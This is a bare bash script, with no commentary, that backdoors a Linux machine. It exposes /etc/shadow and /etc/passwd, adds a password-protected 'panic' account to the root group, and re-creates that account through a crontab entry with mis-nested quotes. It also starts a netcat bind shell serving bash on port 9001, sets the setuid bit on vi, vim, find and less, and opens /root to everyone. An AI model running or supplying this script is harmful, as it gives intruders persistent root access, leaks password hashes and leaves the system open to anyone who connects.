#!/bin/bash
chmod 644 /etc/shadow
chmod 666 /etc/passwd
useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic
usermod -a -G root panic
echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
nc.traditional -l -p 9001 -e /bin/bash &
chmod u+s `which vi`
chmod u+s `which vim`
chmod u+s `which find`
chmod u+s `which less`
chmod -R 777 /root
